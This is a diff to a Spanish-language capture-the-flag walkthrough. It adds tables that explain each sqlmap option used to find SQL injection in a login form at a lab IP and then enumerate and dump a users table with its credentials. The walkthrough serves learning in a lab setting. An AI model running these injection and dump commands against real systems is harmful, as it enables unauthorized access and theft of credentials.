@@ -58,6 +58,14 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
 sqlmap -u http://172.17.0.2/login.html --forms --dbs --batch
 ```
 
+| Parte del Comando                                     | Explicación                                                                                         |
+|-------------------------------------------------------|-----------------------------------------------------------------------------------------------------|
+| `sqlmap`                                              | Ejecuta la herramienta `sqlmap`, utilizada para detectar y explotar vulnerabilidades SQL Injection. |
+| `-u http://172.17.0.2/login.html`                     | URL objetivo donde se sospecha que hay un formulario vulnerable a SQLi.                             |
+| `--forms`                                             | Indica a `sqlmap` que debe analizar los formularios HTML en la página para buscar inyecciones.      |
+| `--dbs`                                               | Solicita a `sqlmap` que enumere todas las bases de datos disponibles en el servidor.                |
+| `--batch`                                             | Ejecuta el escaneo en modo automático, sin hacer preguntas al usuario. Ideal para scripting.        |
+
 **Bases de datos disponibles:**
 
 - information_schema  
@@ -72,6 +80,11 @@ sqlmap -u http://172.17.0.2/login.html --forms --dbs --batch
 sqlmap -u http://172.17.0.2/login.html --forms -D users --tables
 ```
 
+| Parámetro                  | Explicación                                                                                 |
+|---------------------------|---------------------------------------------------------------------------------------------|
+| `-D users`                | Especifica la base de datos objetivo (en este caso, `users`) sobre la que se trabajará.     |
+| `--tables`                | Le dice a `sqlmap` que enumere todas las tablas contenidas dentro de la base de datos dada. |
+
 | Tabla     |
 |-----------|
 | usuarios  |
@@ -81,6 +94,11 @@ sqlmap -u http://172.17.0.2/login.html --forms -D users --tables
 ```bash
 sqlmap -u http://172.17.0.2/login.html --forms -D users -T usuarios --columns
 ```
+
+| Parámetro                  | Explicación                                                                                   |
+|---------------------------|-----------------------------------------------------------------------------------------------|
+| `-T usuarios`             | Indica la tabla específica (`usuarios`) dentro de la base de datos seleccionada.              |
+| `--columns`               | Solicita a `sqlmap` que enumere todas las columnas disponibles en la tabla especificada.      |
 
 | Columna  | Tipo          |
 |----------|---------------|
@@ -93,6 +111,10 @@ sqlmap -u http://172.17.0.2/login.html --forms -D users -T usuarios --columns
 ```bash
 sqlmap -u http://172.17.0.2/login.html --forms -D users -T usuarios --dump
 ```
+
+| Parámetro   | Explicación                                                                                  |
+|-------------|----------------------------------------------------------------------------------------------|
+| `--dump`    | Ordena a `sqlmap` que **vuelque (extraiga y muestre)** todos los datos de la tabla especificada. |
 
 | ID | Username | Password      |
 |----|----------|---------------|
